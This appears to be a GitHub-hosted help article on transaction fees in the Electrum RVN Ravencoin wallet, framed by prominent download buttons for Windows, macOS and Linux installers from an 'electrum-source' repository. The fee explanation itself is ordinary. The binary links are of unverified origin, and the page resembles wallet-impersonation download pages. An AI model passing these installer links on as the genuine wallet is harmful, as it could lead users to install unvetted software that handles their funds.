![Electrum RVN](assets/banner-article.png)

# Electrum RVN Transaction Fees Explained

<!-- compact-download-block -->

<p align="center">What you pay for block space, and why it moves</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A Ravencoin fee is paid in RVN, priced by the size of the transaction, estimated from the server the wallet is connected to, and adjustable after the fact with Replace-By-Fee. It depends on how much space the transaction takes in a block, not on how much RVN you are sending.

## What you are actually paying for

A block has limited room, and every transaction occupies some of it. Miners choose which transactions to include, and the fee is how a transaction competes for that room. So the fee is a price for space, denominated in RVN.

Two consequences follow directly, and they explain almost every surprise:

**Size is about inputs, not value.** A transaction that spends one coin is small. A transaction that spends thirty small payments is large, because each one must be referenced and signed. Sending 10,000 RVN from a single input can cost less than sending 100 RVN gathered from twenty small receipts.

**The fee rate is a market.** The wallet asks its server what rate is currently clearing and offers that as a default. When blocks are full, the clearing rate rises; when they are empty, almost anything confirms.

## How the wallet sets it

The Send tab shows a fee field with a default already filled in. That default comes from the server's estimate and is the right choice most of the time. The wallet also lets you set the rate yourself, and the useful mental model is three positions rather than a number:

| Position | When to use it | Risk |
| --- | --- | --- |
| Default estimate | almost always | waits if the mempool spikes after you send |
| Higher than default | a payment that must confirm quickly | you overpay slightly |
| Lower than default | a transfer to yourself, no deadline | may sit unconfirmed for hours |

The fee is shown in RVN next to the amount, so the total leaving your wallet is visible before you confirm. Read both numbers, not just the amount.

## Why a transaction gets stuck

A transaction below the prevailing rate is not rejected - it waits. Nodes keep it in the mempool and miners skip it while better-paying transactions exist. It can confirm hours later when the queue clears, or never, if the rate stays high.

The fix is Replace-By-Fee: the wallet reissues the same transaction with a higher fee, and the network replaces the original rather than confirming both. It requires the original transaction to have opted in, which the wallet does by default. If your transaction did not opt in, the wait is the only option short of asking the recipient to return the funds. [Stuck Ravencoin transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md) is the step-by-step repair.

## Fees when you send an asset

An asset transfer is a normal transaction with an asset payload, so it pays a fee in RVN like any other - a little larger, because the payload takes space. The practical implication: a wallet holding an asset and zero RVN cannot move that asset. Keep a small RVN float in any wallet that holds something you may need to transfer.

Issuing an asset costs more than sending one, because the issuance transaction carries the name, the quantity and the options. It is still a small amount of RVN by ordinary standards; [issuing a Ravencoin asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md) gives the sequence rather than a number, since the number moves.

## Receiving costs you nothing

The sender pays. You can receive any number of transactions without holding RVN, and a wallet with a zero balance can still receive. What it cannot do is spend, because spending requires a fee - which is the answer to "why can't I move the RVN someone just sent me" when the amount is smaller than the fee would be.

## Consolidating to keep future fees low

If your wallet fills with many small amounts - mining payouts, tips, tiny receipts - each future spend that touches them becomes a large transaction. Consolidating is the fix: send the whole balance to one of your own addresses during a quiet period, paying one fee now to merge many inputs into one. The address rules are the same as any other send - [Ravencoin address format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md) - and the send-max control does the arithmetic.

That transaction is large, so it is the one time to accept a higher fee rather than the lowest. [Ravencoin fee estimation in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-fee-estimation-in-electrum-rvn.md) covers the rate itself and how to read the mempool before choosing one, and the send-max control is what you use to do it: it subtracts the fee from the amount instead of adding it on top.

## Where fees do not apply

There is no monthly fee, no account fee, no withdrawal fee and no fee to receive. The wallet itself is free. The only RVN that leaves your wallet is the fee on a transaction you signed, which is worth knowing when a site offers "free RVN" in exchange for a small transfer. It is also the same fee you pay on the way in and on the way out: [buying Ravencoin for Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/buying-ravencoin-for-electrum-rvn.md) and [selling Ravencoin with Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/selling-ravencoin-with-electrum-rvn.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Fee defaults are read from the server, so a stale build can show a stale estimate; [updating to the latest release](https://github.com/electrum-source/download-and-setup/blob/main/update-electrum-rvn-to-the-latest-release.md) is the first thing to check if the numbers look wrong.

## FAQ

### How much is a Ravencoin transaction fee?

It is small and variable: a price for the block space the transaction takes, set by the wallet from the server's estimate. The wallet shows the exact RVN amount before you confirm, so you never have to guess.

### Why does the fee not depend on the amount I send?

Because it buys block space, not value. A transaction carries the same data whether it moves 1 RVN or 10,000; what changes the size is the number of inputs it spends.

### Can I send with a zero fee?

No. A zero-fee transaction is not relayed or mined, and the wallet will not build one. The minimum that clears varies with network conditions.

### What happens if I set the fee too low?

The transaction stays pending. Nothing is lost: it either confirms when the queue clears, or you replace it with a higher fee. It cannot be double-spent by accident.

### Do asset transactions cost more?

Slightly, because the asset payload adds bytes. The fee is still paid in RVN, which is why a wallet needs a small RVN balance to move an asset.

<!-- related-articles -->

## Related articles

- [Stuck Ravencoin Transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md)
- [How to Issue a Ravencoin Asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md)
- [Ravencoin Address Format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md)
- [Ravencoin Fee Estimation in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-fee-estimation-in-electrum-rvn.md)
